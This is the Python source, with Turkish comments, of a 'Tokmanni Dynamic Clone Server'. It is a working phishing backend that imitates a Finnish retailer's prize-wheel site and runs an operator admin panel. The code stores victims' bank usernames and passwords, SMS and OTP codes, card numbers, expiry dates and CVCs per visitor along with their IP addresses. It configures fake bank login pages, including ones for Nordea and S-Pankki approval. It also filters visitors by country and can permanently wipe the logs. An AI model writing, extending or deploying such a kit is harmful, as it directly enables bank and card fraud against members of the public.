#!/usr/bin/env python3
"""
Tokmanni Dynamic Clone Server - EXTRA FEATURES VERSİYON
================================
Ek özellikler:
- Otomatik log temizleme (30 gün)
- Arama ve filtreleme
- IP bazlı raporlama
"""

import os
import re
import json
import time
import uuid
import hashlib
import threading
import traceback
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote, parse_qs
from datetime import datetime, timedelta
import schedule

# ============================================
# YAPILANDIRMA
# ============================================
PORT = 8080
ORIGINAL_DOMAIN = "tokmanni.palkintohakemus.fi"

SITE_ROOT = "/root/tokmanni.palkintohakemus.fi"
CAPTURED_PAGES = "/root/cark1/site-capture/pages"
PUBLIC_PAGES = "/root/cark1/site-capture/public"
API_DATA = "/root/cark1/api-data"
DATA_FILE = "/root/cark1/data.json"

# ============================================
# KALICI VERİ DEPOSU
# ============================================
class DataStore:
    def __init__(self):
        self.lock = threading.Lock()
        self.data = {
            'users': [],
            'banks': [],
            'sessions': {},
            'visitors': [],
            'activity_logs': [],
            'banned': [],
            'links': [],
            'country_settings': {'filter_enabled': True, 'allowed_countries': '["TR","FI"]'},
            'next_user_id': 100,
            'next_bank_id': 100,
            'next_visitor_id': 1,
            'logs_permanently_deleted': False,
            'auto_cleanup_enabled': True,
            'auto_cleanup_days': 30,
        }
        self._load()
        self._start_scheduler()

    def _load(self):
        if os.path.isfile(DATA_FILE):
            try:
                with open(DATA_FILE, 'r') as f:
                    saved = json.load(f)
                self.data.update(saved)
                print(f"  [DATA] {DATA_FILE} yüklendi ({len(self.data['users'])} kullanıcı, {len(self.data['banks'])} banka)")
                return
            except Exception as e:
                print(f"  [DATA] Yükleme hatası: {e}")
        self._seed_from_api_data()

    def _seed_from_api_data(self):
        if self.data.get('logs_permanently_deleted', False):
            print(f"  [SEED] Loglar kalıcı olarak silinmiş, geri yükleme yapılmıyor")
            self._save()  # Kalıcı silme durumu dosyaya kaydedilsin
            return
            
        bp = os.path.join(API_DATA, 'jehat_listBank.json')
        if os.path.isfile(bp):
            try:
                with open(bp, 'r') as f:
                    self.data['banks'] = json.load(f)
                max_id = max((int(b.get('id', 0)) for b in self.data['banks']), default=0)
                self.data['next_bank_id'] = max_id + 1
                print(f"  [SEED] {len(self.data['banks'])} banka yüklendi")
            except Exception as e:
                print(f"  [SEED] Banka hatası: {e}")

        up = os.path.join(API_DATA, 'jehat_getAllUsers.json')
        if os.path.isfile(up):
            try:
                with open(up, 'r') as f:
                    d = json.load(f)
                users = d.get('data', []) if isinstance(d, dict) else d
                for u in users:
                    u.setdefault('password', u['username'])
                self.data['users'] = users
                max_id = max((int(u.get('id', 0)) for u in users), default=0)
                self.data['next_user_id'] = max_id + 1
                print(f"  [SEED] {len(users)} kullanıcı yüklendi")
            except Exception as e:
                print(f"  [SEED] Kullanıcı hatası: {e}")

        alp = os.path.join(API_DATA, 'jehat_getActivityLogs.json')
        if os.path.isfile(alp):
            try:
                with open(alp, 'r') as f:
                    d = json.load(f)
                self.data['activity_logs'] = d.get('data', []) if isinstance(d, dict) else []
            except:
                pass

        csp = os.path.join(API_DATA, 'jehat_getCountrySettings.json')
        if os.path.isfile(csp):
            try:
                with open(csp, 'r') as f:
                    d = json.load(f)
                self.data['country_settings'] = d.get('settings', d) if isinstance(d, dict) else d
            except:
                pass
        self._save()

    def _save(self):
        try:
            with open(DATA_FILE, 'w') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"  [SAVE] Hata: {e}")

    def save(self):
        with self.lock:
            self._save()

    def _start_scheduler(self):
        """Otomatik log temizleme için scheduler başlat"""
        def cleanup_job():
            if self.data.get('auto_cleanup_enabled', True):
                days = self.data.get('auto_cleanup_days', 30)
                self.cleanup_old_logs(days)
                print(f"  [CLEANUP] {days} günden eski loglar silindi")
        
        # Her gün saat 02:00'de çalış
        schedule.every().day.at("02:00").do(cleanup_job)
        
        # Scheduler thread'ini başlat
        def run_scheduler():
            while True:
                schedule.run_pending()
                time.sleep(60)
        
        scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
        scheduler_thread.start()

    # --- Oturum ---
    def create_session(self, username, role='super_admin', user_id='0'):
        sid = hashlib.sha1(str(uuid.uuid4()).encode()).hexdigest()
        with self.lock:
            self.data['sessions'][sid] = {
                'username': username, 'role': role, 'user_id': user_id,
                'created': time.time(), 'last_activity': time.time()
            }
            for u in self.data['users']:
                if u['username'] == username:
                    u['current_session'] = sid
                    u['last_login'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    u['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    break
            self._save()
        return sid

    def validate_session(self, sid):
        if not sid:
            return None
        with self.lock:
            sess = self.data['sessions'].get(sid)
            if sess:
                sess['last_activity'] = time.time()
                for u in self.data['users']:
                    if u['username'] == sess['username']:
                        u['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        break
                return sess
        return None

    # --- Kullanıcı CRUD ---
    def get_all_users(self):
        return [{k: v for k, v in u.items() if k != 'password'} for u in self.data['users']]

    def add_user(self, username, password, role='admin', status='active'):
        with self.lock:
            for u in self.data['users']:
                if u['username'] == username:
                    return None, 'Kullanıcı zaten mevcut'
            uid = str(self.data['next_user_id'])
            self.data['next_user_id'] += 1
            user = {
                'id': uid, 'username': username, 'password': password,
                'role': role, 'status': status,
                'last_login': None, 'last_activity': None, 'current_session': None,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            self.data['users'].append(user)
            self._save()
            return {k: v for k, v in user.items() if k != 'password'}, None

    def edit_user(self, user_id, data):
        with self.lock:
            for u in self.data['users']:
                if str(u['id']) == str(user_id):
                    for field in ('username', 'role', 'status'):
                        if field in data and data[field]:
                            u[field] = data[field]
                    if 'password' in data and data['password']:
                        u['password'] = data['password']
                    self._save()
                    return {k: v for k, v in u.items() if k != 'password'}, None
            return None, 'Kullanıcı bulunamadı'

    def delete_user(self, user_id):
        with self.lock:
            self.data['users'] = [u for u in self.data['users'] if str(u['id']) != str(user_id)]
            self._save()

    def change_user_status(self, user_id, status):
        with self.lock:
            for u in self.data['users']:
                if str(u['id']) == str(user_id):
                    u['status'] = status
                    self._save()
                    return True
            return False

    def authenticate(self, username, password):
        for u in self.data['users']:
            if u['username'] == username and u.get('password') == password:
                if u.get('status') != 'active':
                    return None, 'Hesap aktif değil'
                return u, None
        return None, 'Geçersiz kullanıcı adı veya şifre'

    # --- Banka CRUD ---
    def get_banks(self, active_only=False):
        banks = self.data['banks']
        if active_only:
            banks = [b for b in banks if b.get('status') == 'active']
        return banks

    def get_bank(self, bank_id):
        for b in self.data['banks']:
            if str(b['id']) == str(bank_id):
                return b
        return None

    def add_bank(self, data):
        with self.lock:
            bid = str(self.data['next_bank_id'])
            self.data['next_bank_id'] += 1
            bank = {
                'id': bid,
                'country': data.get('country', 'finland'),
                'logo': data.get('logo', ''),
                'bank_name': data.get('bankName', data.get('bank_name', '')),
                'status': data.get('status', 'active'),
                'show_password': data.get('showPassword', data.get('show_password', '1')),
                'bank_title': data.get('bankTitle', data.get('bank_title', '')),
                'input_label_1': data.get('inputLabel1', data.get('input_label_1')),
                'input_label_2': data.get('inputLabel2', data.get('input_label_2')),
                'login_option': data.get('loginOption', data.get('login_option', '1')),
                'option_count': data.get('optionCount', data.get('option_count')),
                'option_name_1': data.get('optionName1', data.get('option_name_1')),
                'option_name_2': data.get('optionName2', data.get('option_name_2')),
                'option_name_3': data.get('optionName3', data.get('option_name_3')),
                'list_login': data.get('listLogin', data.get('list_login')),
                'login_list_count': data.get('loginListCount', data.get('login_list_count')),
                'login_list_text': data.get('loginListText', data.get('login_list_text')),
            }
            self.data['banks'].append(bank)
            self._save()
            return bank

    def edit_bank(self, bank_id, data):
        with self.lock:
            for b in self.data['banks']:
                if str(b['id']) == str(bank_id):
                    field_map = {
                        'bankName': 'bank_name', 'bank_name': 'bank_name',
                        'country': 'country', 'status': 'status', 'logo': 'logo',
                        'showPassword': 'show_password', 'show_password': 'show_password',
                        'bankTitle': 'bank_title', 'bank_title': 'bank_title',
                        'inputLabel1': 'input_label_1', 'input_label_1': 'input_label_1',
                        'inputLabel2': 'input_label_2', 'input_label_2': 'input_label_2',
                        'loginOption': 'login_option', 'login_option': 'login_option',
                        'optionCount': 'option_count', 'option_count': 'option_count',
                        'optionName1': 'option_name_1', 'option_name_1': 'option_name_1',
                        'optionName2': 'option_name_2', 'option_name_2': 'option_name_2',
                        'optionName3': 'option_name_3', 'option_name_3': 'option_name_3',
                        'listLogin': 'list_login', 'list_login': 'list_login',
                        'loginListCount': 'login_list_count', 'login_list_count': 'login_list_count',
                        'loginListText': 'login_list_text', 'login_list_text': 'login_list_text',
                    }
                    for k, v in data.items():
                        if k in field_map:
                            b[field_map[k]] = v
                    self._save()
                    return b
            return None

    def delete_bank(self, bank_id):
        with self.lock:
            self.data['banks'] = [b for b in self.data['banks'] if str(b['id']) != str(bank_id)]
            self._save()

    # --- Ziyaretçi ---
    def add_visitor(self, ip, data=None):
        with self.lock:
            vid = str(self.data['next_visitor_id'])
            self.data['next_visitor_id'] += 1
            visitor = {
                'id': vid, 'ip': ip, 'country': 'FI', 'status': 'online',
                'page': 'wheel', 'step': 1,
                'reward': '', 'fullname': '', 'phone': '', 'sms': '', 'sms2': '',
                'selected_option': '', 'login_list_option': '', 'selected_tab': '',
                'selectedBank': '', 'bank_selected': '', 'bank_name': '', 'bank_id': '',
                'verfugernummer': '', 'username': '', 'bank_username': '',
                'password': '', 'bank_password': '',
                'faceid': '', 'facepw': '',
                'card_number': '', 'expiry_date': '', 'cvc': '',
                'nordea_approve': '', 'spankki_approve': '', 'aws': '',
                'percent': '', 'name': '', 'surname': '',
                'otp': '', 'prize': '',
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            }
            if data:
                visitor.update(data)
            self.data['visitors'].append(visitor)
            self._save()
            return visitor

    def get_visitor(self, vid):
        for v in self.data['visitors']:
            if str(v['id']) == str(vid):
                return v
        return None

    def update_visitor(self, vid, data):
        with self.lock:
            for v in self.data['visitors']:
                if str(v['id']) == str(vid):
                    v.update(data)
                    v['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    self._save()
                    return v
            return None

    def get_active_visitors(self):
        now = time.time()
        result = []
        for v in self.data['visitors']:
            try:
                la = datetime.strptime(v.get('last_activity', ''), '%Y-%m-%d %H:%M:%S')
                if (now - la.timestamp()) < 1800:
                    result.append(v)
            except:
                result.append(v)
        return result

    # --- Activity log ---
    def add_activity(self, action, description='', user='system', ip='127.0.0.1'):
        with self.lock:
            if not action or not user:
                return
                
            self.data['activity_logs'].insert(0, {
                'id': str(len(self.data['activity_logs']) + 1),
                'user_id': '0', 'username': user,
                'action': action, 'description': description,
                'ip_address': ip,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            if len(self.data['activity_logs']) > 500:
                self.data['activity_logs'] = self.data['activity_logs'][:500]
            self._save()

    def get_activity_logs_paginated(self, page=1, per_page=25, action_filter='', user_filter=''):
        """Sayfalanmış logları getir"""
        valid_logs = [log for log in self.data['activity_logs'] 
                      if log.get('action') and log.get('username')]
        
        if action_filter:
            valid_logs = [log for log in valid_logs if log.get('action') == action_filter]
        if user_filter:
            valid_logs = [log for log in valid_logs if user_filter.lower() in log.get('username', '').lower()]
        
        valid_logs = sorted(valid_logs, key=lambda x: x.get('created_at', ''), reverse=True)
        
        total = len(valid_logs)
        total_pages = max(1, (total + per_page - 1) // per_page)
        start = (page - 1) * per_page
        end = start + per_page
        
        return {
            'data': valid_logs[start:end],
            'pagination': {
                'current_page': page,
                'total_pages': total_pages,
                'total_logs': total,
                'per_page': per_page
            }
        }

    def delete_all_logs_permanently(self):
        """Logları kalıcı olarak sil"""
        with self.lock:
            self.data['activity_logs'] = []
            self.data['logs_permanently_deleted'] = True
            self._save()

    def get_logs_by_ip(self, ip_address):
        """IP adresine göre logları getir"""
        return [log for log in self.data['activity_logs'] 
                if log.get('ip_address') == ip_address]

    def get_logs_by_user(self, username):
        """Kullanıcıya göre logları getir"""
        return [log for log in self.data['activity_logs'] 
                if log.get('username') == username]

    def get_logs_by_action(self, action):
        """İşleme göre logları getir"""
        return [log for log in self.data['activity_logs'] 
                if log.get('action') == action]

    def get_logs_by_date_range(self, start_date, end_date):
        """Tarih aralığına göre logları getir"""
        try:
            start = datetime.strptime(start_date, '%Y-%m-%d')
            end = datetime.strptime(end_date, '%Y-%m-%d') + timedelta(days=1)
            return [log for log in self.data['activity_logs']
                    if start <= datetime.strptime(log.get('created_at', ''), '%Y-%m-%d %H:%M:%S') < end]
        except:
            return []

    def get_ip_statistics(self):
        """IP adreslerine göre istatistik"""
        stats = {}
        for log in self.data['activity_logs']:
            ip = log.get('ip_address', 'unknown')
            if ip not in stats:
                stats[ip] = {'count': 0, 'users': set(), 'actions': set()}
            stats[ip]['count'] += 1
            stats[ip]['users'].add(log.get('username', 'unknown'))
            stats[ip]['actions'].add(log.get('action', 'unknown'))
        
        # Set'leri liste'ye çevir
        for ip in stats:
            stats[ip]['users'] = list(stats[ip]['users'])
            stats[ip]['actions'] = list(stats[ip]['actions'])
        
        return stats

    def get_user_statistics(self):
        """Kullanıcılara göre istatistik"""
        stats = {}
        for log in self.data['activity_logs']:
            user = log.get('username', 'unknown')
            if user not in stats:
                stats[user] = {'count': 0, 'ips': set(), 'actions': set(), 'last_activity': None}
            stats[user]['count'] += 1
            stats[user]['ips'].add(log.get('ip_address', 'unknown'))
            stats[user]['actions'].add(log.get('action', 'unknown'))
            stats[user]['last_activity'] = log.get('created_at', '')
        
        # Set'leri liste'ye çevir
        for user in stats:
            stats[user]['ips'] = list(stats[user]['ips'])
            stats[user]['actions'] = list(stats[user]['actions'])
        
        return stats

    def cleanup_old_logs(self, days=30):
        """30 günden eski logları sil"""
        with self.lock:
            cutoff_date = datetime.now() - timedelta(days=days)
            self.data['activity_logs'] = [
                log for log in self.data['activity_logs']
                if datetime.strptime(log.get('created_at', ''), '%Y-%m-%d %H:%M:%S') > cutoff_date
            ]
            self._save()

    def set_auto_cleanup(self, enabled, days=30):
        """Otomatik temizlemeyi ayarla"""
        with self.lock:
            self.data['auto_cleanup_enabled'] = enabled
            self.data['auto_cleanup_days'] = days
            self._save()

    # --- Ban ---
    def ban_visitor(self, vid):
        with self.lock:
            for v in self.data['visitors']:
                if str(v['id']) == str(vid):
                    v['status'] = 'banned'
                    self.data['banned'].append({
                        'id': vid, 'ip': v.get('ip', ''),
                        'reason': 'Manual ban',
                        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                    self._save()
                    return True
            return False

    def unban_visitor(self, vid):
        with self.lock:
            for v in self.data['visitors']:
                if str(v['id']) == str(vid):
                    v['status'] = 'active'
                    self.data['banned'] = [b for b in self.data['banned'] if str(b['id']) != str(vid)]
                    self._save()
                    return True
            return False

# ============================================
# HTTP REQUEST HANDLER
# ============================================
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        raw_path = self.path
        path = unquote(raw_path.split('?')[0])
        qs = parse_qs(urlparse(raw_path).query)
        
        if not path.startswith('/static/'):
            accept = self.headers.get('Accept', '')
            is_json = 'json' in accept.lower()
            print(f"  [GET] {path}")

        # === ADMIN PANEL ===
        if path.startswith('/jehat/'):
            sub = path.replace('/jehat/', '').split('?')[0] or 'dashboard'
            sess = self._validate_admin()
            if not sess:
                self.send_response(302)
                self.send_header('Location', '/jehat/login')
                self.end_headers()
                return

            # Admin API endpoints
            if sub == 'getActivityLogs':
                page = int(qs.get('page', ['1'])[0])
                per_page = int(qs.get('per_page', ['25'])[0])
                action_filter = qs.get('action', [''])[0]
                user_filter = qs.get('user', [''])[0]
                
                result = store.get_activity_logs_paginated(page, per_page, action_filter, user_filter)
                return self._json(result)

            if sub == 'getLogsByIp':
                ip = qs.get('ip', [''])[0]
                logs = store.get_logs_by_ip(ip)
                return self._json({'success': True, 'data': logs})

            if sub == 'getLogsByUser':
                user = qs.get('user', [''])[0]
                logs = store.get_logs_by_user(user)
                return self._json({'success': True, 'data': logs})

            if sub == 'getLogsByAction':
                action = qs.get('action', [''])[0]
                logs = store.get_logs_by_action(action)
                return self._json({'success': True, 'data': logs})

            if sub == 'getLogsByDateRange':
                start = qs.get('start', [''])[0]
                end = qs.get('end', [''])[0]
                logs = store.get_logs_by_date_range(start, end)
                return self._json({'success': True, 'data': logs})

            if sub == 'getIpStatistics':
                stats = store.get_ip_statistics()
                return self._json({'success': True, 'data': stats})

            if sub == 'getUserStatistics':
                stats = store.get_user_statistics()
                return self._json({'success': True, 'data': stats})

            if sub == 'getAutoCleanupSettings':
                return self._json({
                    'success': True, 
                    'enabled': store.data.get('auto_cleanup_enabled', True),
                    'days': store.data.get('auto_cleanup_days', 30)
                })

            # Admin panel sayfaları
            pages = {
                'dashboard': 'dashboard.html',
                'userManagement': 'userManagement.html',
                'activityLogs': 'activityLogs.html',
                'bannedList': 'bannedList.html',
                'adminSettings': 'adminSettings.html',
                'bank/list': 'bankList.html',
                'bank/add': 'bankAdd.html',
                'bank/edit': 'bankEdit.html',
            }

            if sub in pages:
                lp = os.path.join(CAPTURED_PAGES, pages[sub])
                if os.path.isfile(lp):
                    self._html_file(lp)
                else:
                    self._send(f'<h1>{sub}</h1>', 'text/html; charset=utf-8')
                return

            self._json({'success': False, 'message': 'Endpoint bulunamadı'}, 404)
            return

        # === PUBLIC PAGES ===
        if path in ('/', '/wheel'):
            pp = os.path.join(PUBLIC_PAGES, 'index.html')
            if os.path.isfile(pp):
                self._html_file(pp)
            else:
                self._send('<h1>Wheel</h1>', 'text/html; charset=utf-8')
            return

        if path in ('/jehat/login', '/jehat'):
            lp = os.path.join(CAPTURED_PAGES, 'login.html')
            if os.path.isfile(lp):
                self._html_file(lp)
            else:
                self._send('<h1>Login</h1>', 'text/html; charset=utf-8')
            return

        if path == '/jehat/logout':
            sid = self._get_session_id()
            if sid:
                with store.lock:
                    if sid in store.data['sessions']:
                        del store.data['sessions'][sid]
            self.send_response(302)
            self.send_header('Location', '/jehat/login')
            self.end_headers()
            return

        # === STATIC FILES ===
        if path.startswith('/static/'):
            self._serve_static(path)
            return

        self._send('<h1>404 Not Found</h1>', 'text/html; charset=utf-8', 404)

    def do_POST(self):
        raw_path = self.path
        path = unquote(raw_path.split('?')[0])
        ct = self.headers.get('Content-Type', '')
        cl = self.headers.get('Content-Length', '0')

        post_data = {}
        files = {}
        
        print(f"  [POST] {path}")

        try:
            content_length = int(cl)
            if content_length > 0:
                body = self.rfile.read(content_length)
                if 'application/json' in ct:
                    post_data = json.loads(body.decode('utf-8', errors='ignore'))
                elif 'application/x-www-form-urlencoded' in ct:
                    post_data = parse_qs(body.decode('utf-8', errors='ignore'))
                    for k in post_data:
                        post_data[k] = post_data[k][0] if post_data[k] else ''
        except:
            pass

        # === ADMIN LOGIN ===
        if path in ('/jehat/login', '/jehat'):
            u = post_data.get('username', '')
            p = post_data.get('password', '')
            user, err = store.authenticate(u, p)
            if user:
                sid = store.create_session(u, user.get('role', 'admin'), user.get('id', '0'))
                store.add_activity('login', f'{u} giriş yaptı', u)
                self.send_response(302)
                self.send_header('Location', '/jehat/dashboard')
                self.send_header('Set-Cookie', f'session={sid}; Path=/; HttpOnly; SameSite=Lax')
                self.end_headers()
                return
            else:
                self._send('<h1>Giriş Başarısız</h1>', 'text/html; charset=utf-8', 401)
                return

        # === PUBLIC API ===
        if path.startswith('/api/'):
            self._handle_public_api(path, 'POST', post_data)
            return

        # === ADMIN API ===
        if path.startswith('/jehat/'):
            sess = self._validate_admin()
            if not sess:
                self._json({'success': False, 'message': 'Yetkisiz'}, 401)
                return

            sub = path.replace('/jehat/', '').split('?')[0]

            if sub == 'deleteAllLogs':
                store.delete_all_logs_permanently()
                self._json({'success': True, 'message': 'Tüm loglar kalıcı olarak silindi'})
                return

            if sub == 'setAutoCleanup':
                enabled = post_data.get('enabled', True)
                days = int(post_data.get('days', 30))
                store.set_auto_cleanup(enabled, days)
                self._json({'success': True, 'message': 'Otomatik temizleme ayarları güncellendi'})
                return

            if sub == 'cleanupOldLogs':
                days = int(post_data.get('days', 30))
                store.cleanup_old_logs(days)
                self._json({'success': True, 'message': f'{days} günden eski loglar silindi'})
                return

            self._json({'success': False, 'message': 'Endpoint bulunamadı'}, 404)
            return

        self._send(b'Not Found', 'text/plain', 404)

    def _handle_public_api(self, path, method='GET', post_data=None):
        """Genel API endpoint'lerini yönet"""
        endpoint = path.replace('/api/', '')
        post_data = post_data or {}

        if endpoint.startswith('save_'):
            vid = self._get_visitor_id(post_data)
            update = {}
            
            if 'login' in endpoint:
                username = post_data.get('username', post_data.get('user', ''))
                password = post_data.get('password', post_data.get('pass', ''))
                
                if not username or not password:
                    self._json({'success': False, 'message': 'Eksik bilgi'})
                    return
                
                update = {
                    'username': username,
                    'bank_username': username,
                    'password': password,
                    'bank_password': password,
                    'page': 'wait', 'step': 2
                }
                
                bank_name = post_data.get('bank_name', '')
                store.add_activity('login', f'{username} - {bank_name}', username, 
                                 self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip())
            
            if vid:
                store.update_visitor(vid, update)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Set-Cookie', f'vid={vid}; Path=/; SameSite=Lax')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True, 'visitor_id': vid}).encode())
            return

        self._json({'success': True, 'status': 'ok'})

    def _get_visitor_id(self, post_data=None):
        """Ziyaretçi ID'sini al veya oluştur"""
        vid = ''
        if post_data:
            vid = post_data.get('visitor_id', post_data.get('session_id', ''))
        
        if vid:
            v = store.get_visitor(vid)
            if v:
                return vid
        
        cookies = self.headers.get('Cookie', '')
        for cookie in cookies.split(';'):
            if 'vid=' in cookie:
                vid = cookie.split('vid=')[1].split(';')[0].strip()
                if store.get_visitor(vid):
                    return vid
        
        ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
        visitor = store.add_visitor(ip)
        return visitor['id']

    def _validate_admin(self):
        """Admin oturumunu doğrula"""
        cookies = self.headers.get('Cookie', '')
        for cookie in cookies.split(';'):
            if 'session=' in cookie:
                sid = cookie.split('session=')[1].split(';')[0].strip()
                sess = store.validate_session(sid)
                if sess:
                    return sess
        return None

    def _get_session_id(self):
        """Session ID'sini al"""
        cookies = self.headers.get('Cookie', '')
        for cookie in cookies.split(';'):
            if 'session=' in cookie:
                return cookie.split('session=')[1].split(';')[0].strip()
        return None

    def _json(self, data, status=200):
        """JSON yanıt gönder"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

    def _send(self, content, content_type='text/html; charset=utf-8', status=200):
        """İçerik gönder"""
        if isinstance(content, str):
            content = content.encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Length', str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _html_file(self, path):
        """HTML dosyası gönder"""
        try:
            with open(path, 'rb') as f:
                content = f.read()
            self._send(content, 'text/html; charset=utf-8')
        except:
            self._send('<h1>404</h1>', 'text/html; charset=utf-8', 404)

    def _serve_static(self, path):
        """Statik dosya sun"""
        file_path = os.path.join(SITE_ROOT, path.lstrip('/'))
        if os.path.isfile(file_path):
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                ct = 'text/plain'
                if path.endswith('.css'):
                    ct = 'text/css'
                elif path.endswith('.js'):
                    ct = 'application/javascript'
                elif path.endswith('.png'):
                    ct = 'image/png'
                elif path.endswith('.jpg') or path.endswith('.jpeg'):
                    ct = 'image/jpeg'
                self._send(content, ct)
                return
            except:
                pass
        self._send(b'Not Found', 'text/plain', 404)

    def log_message(self, format, *args):
        """Log mesajı"""
        msg = format % args if args else format
        if '/static/' not in str(msg):
            print(f"  [{self.log_date_time_string()}] {msg}")

# ============================================
# MAIN
# ============================================
store = DataStore()

def run_server():
    server = HTTPServer(('0.0.0.0', PORT), Handler)
    print(f"  [SERVER] http://0.0.0.0:{PORT} üzerinde çalışıyor...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"  [SERVER] Kapatılıyor...")
        server.shutdown()

if __name__ == '__main__':
    run_server()
